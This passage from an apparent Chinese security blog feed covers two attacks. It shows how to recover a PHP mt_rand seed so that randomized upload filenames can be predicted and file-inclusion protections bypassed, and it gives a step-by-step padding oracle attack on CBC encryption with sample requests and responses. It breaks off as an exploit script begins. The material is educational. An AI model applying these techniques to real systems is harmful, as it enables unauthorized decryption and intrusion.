double-quoted-string">"A"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"b"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"B"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"c"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"C"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"d"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"D"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"e"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"E"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"f"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"F"</span><span class="token punctuation">,</span>    <span class="token string double-quoted-string">"g"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"G"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"h"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"H"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"i"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"I"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"j"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"J"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"k"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"K"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"l"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"L"</span><span class="token punctuation">,</span>    <span class="token string double-quoted-string">"m"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"M"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"n"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"N"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"o"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"O"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"p"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"P"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"q"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"Q"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"r"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"R"</span><span class="token punctuation">,</span>    <span class="token string double-quoted-string">"s"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"S"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"t"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"T"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"u"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"U"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"v"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"V"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"W"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"x"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"X"</span><span class="token punctuation">,</span>    <span class="token string double-quoted-string">"y"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"Y"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"z"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"Z"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"3"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"4"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"5"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"6"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"7"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"8"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"9"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token operator">++</span><span class="token variable">$i</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$set</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$str</span> <span class="token operator">.=</span> <span class="token variable">$set</span><span class="token punctuation">[</span><span class="token variable">$ch</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$seed</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9999999999</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$seed</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ss</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hash</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$ss</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'SESSION'</span><span class="token punctuation">,</span> <span class="token variable">$hash</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'./up104Ds/'</span> <span class="token operator">.</span> <span class="token function">random_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'_'</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file-upload-field'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>代码审计</li></ul><blockquote><ol><li><strong>random_str 函数</strong>：这个函数用于生成一个指定长度的随机字符串。它使用了一个包含大小写字母和数字的字符集 <code>$set</code>。通过循环，每次从字符集中随机选择一个字符并拼接到结果字符串 <code>$str</code> 中。</li><li>**session_start()**：启动会话，这是 PHP 中用于管理用户会话的函数。</li><li><strong>$seed</strong>：生成一个随机种子，用于初始化随机数生成器，以确保每次生成的随机数序列都不同。</li><li>**mt_srand($seed)**：使用 <code>$seed</code> 初始化 Mersenne Twister 随机数生成器。</li><li>**$ss = mt_rand()**：使用 Mersenne Twister 算法生成一个随机数。</li><li>**$hash = md5(session_id() . $ss)**：将会话 ID 和随机数 <code>$ss</code> 连接起来，然后使用 MD5 算法生成一个哈希值。</li><li>**setcookie(‘SESSION’, $hash, time() + 3600)**：设置一个名为 ‘SESSION’ 的 cookie，其值为生成的哈希值，有效期为 1 小时（3600 秒）。</li><li><strong>$filename</strong>：构造一个文件名，该文件名由一个随机字符串和上传文件的原始文件名组成，用于保存上传的文件。</li></ol></blockquote><h3 id="3-3-2-目标——预测文件名"><a href="#3-3-2-目标——预测文件名" class="headerlink" title="3.3.2 目标——预测文件名"></a>3.3.2 目标——预测文件名</h3><p>文件名的组成如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token string">'./up104Ds/'</span> <span class="token builtin class-name">.</span> random_str<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin class-name">.</span> <span class="token string">'_'</span> <span class="token builtin class-name">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file-upload-field'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>./up104Ds/+随机文件名+<span class="token string">"_"</span>+上传时的文件名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>随机数的生成主要依赖于：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$set</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">.=</span> <span class="token variable">$set</span><span class="token punctuation">[</span><span class="token variable">$ch</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-3-3-解决思路"><a href="#3-3-3-解决思路" class="headerlink" title="3.3.3 解决思路"></a>3.3.3 解决思路</h3><h4 id="1）获取播种后第一次生成的随机数"><a href="#1）获取播种后第一次生成的随机数" class="headerlink" title="1）获取播种后第一次生成的随机数"></a>1）获取播种后第一次生成的随机数</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$seed</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9999999999</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$seed</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ss</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hash</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$ss</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'SESSION'</span><span class="token punctuation">,</span> <span class="token variable">$hash</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>会话未建立时，session_id()的值为空，则$hash的值为md5(第一个随机数)</p><p>通过破解哈希值，的到第一个随机数：1608834717</p><h4 id="2）推断种子"><a href="#2）推断种子" class="headerlink" title="2）推断种子"></a>2）推断种子</h4><p>此时可以通过php_mt_srand反推随机数种子：</p><blockquote><p>./php_mt_seed 1608834717</p><p>Found 0, trying 335544320 - 369098751, speed 49932190 seeds per second</p><p>seed = 353675865</p></blockquote><h4 id="3）推断随机数序列"><a href="#3）推断随机数序列" class="headerlink" title="3）推断随机数序列"></a>3）推断随机数序列</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php">mt <span class="token function">srand</span><span class="token punctuation">(</span><span class="token number">353675865</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> mt <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">mt_rand</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./php mt_rand.php<span class="token number">1608834717</span><span class="token number">364052752</span><span class="token number">104617820</span><span class="token number">1855329673</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4）预测文件名"><a href="#4）预测文件名" class="headerlink" title="4）预测文件名"></a>4）预测文件名</h4><p>预测出随机数序列之后，便可以预测出随机文件名的每一位，从而最终获得文件名。</p><p>最终可以绕过随机文件名防护，实现文件包含等漏洞的利用。</p><h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h1><p>伪随机数生成的安全性对许多应用至关重要，尤其是在密码学领域。为了确保伪随机数的安全性，必须考虑以下几个方面：</p><ol><li><strong>使用加密安全的伪随机数生成器（CSPRNG）</strong>。</li><li><strong>增加种子熵</strong>，避免使用低熵或固定种子。</li><li><strong>定期更新内部状态</strong>，避免周期性输出和回溯攻击。</li><li><strong>选择高质量的算法</strong>，避免使用简单、过时的PRNG。</li></ol><p>在高安全性场景下，建议结合<strong>硬件随机数生成器</strong>和<strong>加密安全算法</strong>，以提供更强的随机性和安全性。</p>]]></content>
      
      
      <categories>
          
          <category> 密码学算法安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学算法安全 </tag>
            
            <tag> 随机数安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>padding oracle攻击</title>
      <link href="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/"/>
      <url>/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="一、CBC模式简介"><a href="#一、CBC模式简介" class="headerlink" title="一、CBC模式简介"></a>一、CBC模式简介</h1><p>CBC（Cipher Block Chaining，密码块链模式）是一种分组密码的加密模式，它通过将每个明文块与前一个密文块进行异或操作后再加密，以确保数据的安全性。</p><h2 id="1-1-CBC加密流程"><a href="#1-1-CBC加密流程" class="headerlink" title="1.1 CBC加密流程"></a>1.1 CBC加密流程</h2><p>在CBC模式中，首先对明文进行分组，每个明文块先与前一个密文块进行异或后，再进行加密。CBC模式下，每个密文块依赖于前面的所有的明文块。</p><p>涉及到的概念：</p><ol><li><strong>初始化向量（IV）</strong>：CBC模式使用一个初始化向量（IV），这是一个随机生成的值，与第一个明文块进行异或操作。IV的作用是为加密过程提供一个随机的起点，确保相同的明文块在不同的加密过程中产生不同的密文块。</li></ol><h3 id="1-1-1-加密流程"><a href="#1-1-1-加密流程" class="headerlink" title="1.1.1 加密流程"></a>1.1.1 加密流程</h3><p>其加密流程示意图如下：</p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2010.00.05.png" alt="CBC模式加密流程" style="zoom:50%;"><ul><li>将明文分为固定大小的块（通常是8字节或16字节）。</li><li>第一个明文块与IV进行异或操作。</li><li>异或后的结果通过加密算法（如AES）加密，生成第一个密文块。</li><li>每个后续的明文块都与前一个密文块进行异或操作，然后再加密，生成下一个密文块。</li></ul><p>密文分组3受到明文分组1、明文分组2、明文分组3的共同影响。</p><h3 id="1-1-2-解密流程"><a href="#1-1-2-解密流程" class="headerlink" title="1.1.2 解密流程"></a>1.1.2 解密流程</h3><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2010.01.51.png" alt="CBC模式解密流程" style="zoom:50%;"><ul><li>将密文分为相同的块大小。</li><li>第一个密文块通过解密算法解密，然后与IV进行异或操作，恢复出第一个明文块。</li><li>每个后续的密文块都先解密，然后与前一个密文块进行异或操作，恢复出原始的明文块。</li></ul><p>与加密过程不同的是名文分组3仅受密文分组2和密文分组3的共同影响。</p><h3 id="1-1-3-填充（Padding）"><a href="#1-1-3-填充（Padding）" class="headerlink" title="1.1.3 填充（Padding）"></a>1.1.3 填充（Padding）</h3><p>分组带来一个问题，就是明文不可能恰好是block的整数倍，对于不能整除剩余的部分数据就涉及到填充操作。</p><p>在加密最后一个不完整的明文块时，需要进行填充以确保块的大小符合加密算法的要求。常见的填充方式有PKCS#5和OneAndZeroes。</p><h4 id="1）PKCS-5："><a href="#1）PKCS-5：" class="headerlink" title="1）PKCS#5："></a>1）PKCS#5：</h4><p>在最后一个block中将不足的Byte数作为Byte值进行填充，缺少n个Byte，就填充n个0x0n，例如最后一个分组（block）缺少3个byte，就填充3个0x03到结尾。在解密时会校验明文的填充是否满足该规则，如果是以N个0x0N结束，则意味着解密操作执行成功，否则解密操作失败。</p><h4 id="2）OneAndZeroes："><a href="#2）OneAndZeroes：" class="headerlink" title="2）OneAndZeroes："></a>2）OneAndZeroes：</h4><p>在最后一个Block中将不足的byte位数以 0x80开头后续全填0x00的方式进行填充，若最后一个Block缺少3byte，则填充：0x80 0x00 0x00。</p><h1 id="二、Padding-Oracle攻击原理"><a href="#二、Padding-Oracle攻击原理" class="headerlink" title="二、Padding Oracle攻击原理"></a>二、Padding Oracle攻击原理</h1><p>这种攻击方式在2011年的Pwnie Rewards中被评为“最具有价值的服务器漏洞”，因为它能够绕过对算法的直接破解，通过旁路攻击的方式被利用。</p><p>核心原理：明文分组和填充，同时应用程序对于填充异常的响应可以作为反馈。</p><h2 id="2-1-利用场景"><a href="#2-1-利用场景" class="headerlink" title="2.1 利用场景"></a>2.1 利用场景</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://www.example.com/decrypt.jsp?data<span class="token operator">=</span>0000000000000000EFC2807233F9D7C097116BB33E813C5E<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当攻击者在篡改data值时会有以下不同的响应：</p><ul><li>如果data值没有被篡改，则解密成功，并且业务校验成功，响应200</li><li>如果data值被篡改，服务端无法完成解密，解密校验失败，则响应500</li><li>如果data值被篡改，但是服务端解密成功，但业务逻辑校验失败，则可能返回200或302等响应码,而不是响应500</li></ul><p>攻击者只需关注解密成功和解密失败的响应即可（第三种属于解密成功的响应），即可完成攻击。</p><h2 id="2-2-破解密文"><a href="#2-2-破解密文" class="headerlink" title="2.2 破解密文"></a>2.2 破解密文</h2><h3 id="2-2-1-核心思路"><a href="#2-2-1-核心思路" class="headerlink" title="2.2.1 核心思路"></a>2.2.1 核心思路</h3><p>攻击者通过修改密文并发送给服务器，观察服务器对不同密文的响应。如果密文的填充正确，服务器会返回一个成功的响应；如果填充不正确，服务器会返回一个错误响应。攻击者利用这种差异性来确定密文的正确填充，从而逐步解密密文或构造出任意明文的合法密文。</p><h3 id="2-2-2-攻击过程"><a href="#2-2-2-攻击过程" class="headerlink" title="2.2.2 攻击过程"></a>2.2.2 攻击过程</h3><p>假设有这样一个应用，请求如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://www.example.com/decrypt.jsp?data<span class="token operator">=</span>7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即client给server提交的参数为<code>7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6</code> 才能请求正常的服务.</p><h4 id="1）内在加解密过程（不为攻击者所知晓）"><a href="#1）内在加解密过程（不为攻击者所知晓）" class="headerlink" title="1）内在加解密过程（不为攻击者所知晓）"></a>1）内在加解密过程（不为攻击者所知晓）</h4><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2010.03.19.png" alt="IV+密文值" style="zoom:80%;"><p>IV添加在密文的前段，即最前面8个字节。</p><ul><li>加密过程</li></ul><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.26.09.png" alt="加密过程" style="zoom:80%;"><ul><li>解密过程</li></ul><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.27.56.png" alt="解密过程" style="zoom:80%;"><p>值得注意的是，解密之后的最后一个数据块，其结尾应该包含正确的填充序列，如果不满足，加解密程序会返回异常（500）。</p><h4 id="2）攻击者视角破解密文"><a href="#2）攻击者视角破解密文" class="headerlink" title="2）攻击者视角破解密文"></a>2）攻击者视角破解密文</h4><ul><li>IV值置空</li></ul><p>取第一个Block的密文，并将初始化向量置为0，即：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> F8 <span class="token number">51</span> D6 CC <span class="token number">68</span> FC <span class="token number">95</span> <span class="token number">37</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这时的请求和响应：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Request: http://sampleapp/home.jsp?<span class="token environment constant">UID</span><span class="token operator">=</span>0000000000000000F851D6CC68FC9537Response: <span class="token number">500</span> - Internal Server Error<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>回复500说明填充异常，原因是它的结尾未包含正确的填充字节：</p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.32.04.png" alt="0000000000000000F851D6CC68FC9537解密失败" style="zoom:80%;"><p>如上图所示，在解密之后，数据块的末尾并没有包含正确的填充序列，因此出现了异常。</p><ul><li>接下来尝试爆破，使得最后的填充序列满足<code>n个0xn</code>的条件</li></ul><p>我们将IV加1，并且发送同样密文</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Request: http://sampleapp/home.jsp?<span class="token environment constant">UID</span><span class="token operator">=</span>0000000000000001F851D6CC68FC9537Response: <span class="token number">500</span> - Internal Server Error<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.34.03.png" alt="0000000000000001F851D6CC68FC9537解密失败" style="zoom:80%;"><p>重复发送这样的请求，每次将IV的最后一个字节加一（直至<code>0xFF</code>），那么最终我们将会产生一个合法的单字节填充序列（<code>0x01</code>）</p><p>对于可能的256个值中，只有一个值会产生正确的填充字节<code>0x01</code>，遇上这个值的时候，会得到一个不同于其他255个请求的回复结果。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Request: http://sampleapp/home.jsp?<span class="token environment constant">UID</span><span class="token operator">=</span>000000000000003CF851D6CC68FC9537Response: <span class="token number">200</span> OK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.36.05.png" alt="000000000000003CF851D6CC68FC9537解密成功" style="zoom:80%;"><ul><li>推断出中间值（Intermediary Value）的最后一个字节（注意中间值攻击者不知道，他是攻击者攻击的目标）</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Intermediary Byte 异或 <span class="token number">0</span>×3C <span class="token operator">==</span> <span class="token number">0</span>×01, Intermediary Byte <span class="token operator">==</span> <span class="token number">0</span>×3C ^ <span class="token number">0</span>×01, Intermediary Byte <span class="token operator">==</span> <span class="token number">0</span>×3D<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>重点：第一组密文解密的中间值是一直不变的，同样也是正确的，我们通过构造IV值，使得最后一位填充值满足0x01，符合padding规则，则意味着程序解密成功（当然解密的结果肯定不是原来的明文），通过循环测试的方法，猜解出中间值的最后一位，再利用同样的方式猜解前面的中间值，直到获取到完整的中间值。</p><ul><li>推断出中间值的倒数第二个字节。</li></ul><p>构造填充值为<code>0x02 0x02</code>的场景，即存在2个填充字节，填充值为<code>0x02</code>。</p><p>此时我们已经知道了中间值得最后一位为<code>0x3D</code>,计算出初始向量的最后一位：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0x3D xor 0x02 <span class="token operator">=</span> 0x3F<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即初始向量为<code>0000000000000003F</code></p><p>遍历倒数第二个字节从<code>0x00~0xFF</code>，直到响应成功.</p><p>猜解出中间值得后两个字节分别为 <code>0x26 0x3D</code></p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.45.22.png" alt="破解出中间值的倒数第二个字节" style="zoom:80%;"><ul><li>推断出整个中间值</li></ul><p>运用这种技巧，我们可以最终得到解密后的中间值，也就是当整个数据块的填充值都是<code>0x08</code></p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.46.30.png" alt="中间值完整推断" style="zoom:80%;"><ul><li>明文破解</li></ul><p>当第一组密文的中间值猜解成功后，我们将中间值和已知的IV做异或，则得到第一组密文的明文：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0x39 0x73 0x23 0x22 0x07 0x6A 0x26 0x3D  异或  0x7B 0x21 0x6A 0x63 0x49 0x51 0x17 0x0F<span class="token operator">=</span> BRIAN<span class="token punctuation">;</span><span class="token number">12</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>续破解第二组密文，第二组密文的IV向量是第一组密文，按照上述的逻辑构造第一组密文，即可破解出第二组明文。</p><h3 id="2-2-3-思路总结"><a href="#2-2-3-思路总结" class="headerlink" title="2.2.3 思路总结"></a>2.2.3 思路总结</h3><ul><li>将IV最后一个字节设置为0x1，不断调整IV最后一个字节（0x01-0xff），爆破使得填充规则正确(7byte+0x01)，得到中间值的最后一个字节。</li><li>在得到最后一个字节的中间值后，将IV最后一个字节设置为0x02，计算IV的最后一个字节。</li><li>不断调整IV倒数第二个字节（0x01-0xff），爆破使得填充规则正确（6byte+0x02+0x02），得到倒数第二个字节的中间值。</li><li>依次类推获得整个中间值。</li><li>中间值和IV异或获得明文。</li></ul><h2 id="2-3伪造明文"><a href="#2-3伪造明文" class="headerlink" title="2.3伪造明文"></a>2.3伪造明文</h2><p>通过密文的破解过程，我们已经掌握了中间值（中间值同密文块是绑定的）和IV。</p><p>结合解密的流程，我们可以通过操纵IV来控制（密文块）解密得到的结果。</p><p>如果想要将密文中第一个数据块解密为“TEST”这个值，您可以计算出它所需要的IV值，只要将目标明文与中间值进行异或操作即可</p><p>只要将字符串”TEST”和4个<code>0x04</code>填充字节与中间值异或之后，便可以得到最终的IV，即<code>0×6D，0×36，0×70，0×76，0×03，0×6E，0×22，0×39</code></p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.52.22.png" alt="伪造明文示例" style="zoom:80%;"><p>如何生成长度超过一个数据块的明文，比如要生成”ENCRYPT TEST”</p><p>首先还是将文本拆成数据块，并设置填充字节</p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.54.01.png" alt="伪造大于一个块的明文长度" style="zoom:60%;"><p>通过类似的步骤我们可以知道生成TEST0x040x040x040x04的中间值(0xc3 0x60 0xed 0xc9 0x 6d 0xf9 0x90 0x32)和IV1(也就是BLOCK1对应的密文)。</p><p>接下来，我们需要弄明白中间值IV1在作为密文是如何解密的。</p><p>只要使用与之前破解过程相同的技巧就行了，我们把它作为密文传递给应用程序，并从全部为NULL的IV开始进行暴力破解。的到IV1对应的中间值IV1_IM。</p><p>通过IV1_IM可以构造BLOCK1的明文为ENCRYPT%20，然后计算得到初始IV值。 </p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2011.06.12.png" style="zoom:80%;"><h1 id="三、exp"><a href="#三、exp" class="headerlink" title="三、exp"></a>三、exp</h1><h2 id="3-1-poa-py"><a href="#3-1-poa-py" class="headerlink" title="3.1 poa.py"></a>3.1 poa.py</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token keyword">from</span> hexdump <span class="token keyword">import</span> hexdump<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">import</span> IPythonplain <span class="token operator">=</span> <span class="token string">b"Hello World! MTDP! RedTeam! 23333"</span><span class="token keyword">class</span> <span class="token class-name">POA</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    KEY <span class="token operator">=</span> <span class="token string">b"1234567890abcdef"</span>    IV <span class="token operator">=</span> <span class="token string">b"0102030405060708"</span>    <span class="token decorator annotation punctuation">@classmethod</span>    <span class="token keyword">def</span> <span class="token function">__pad</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> 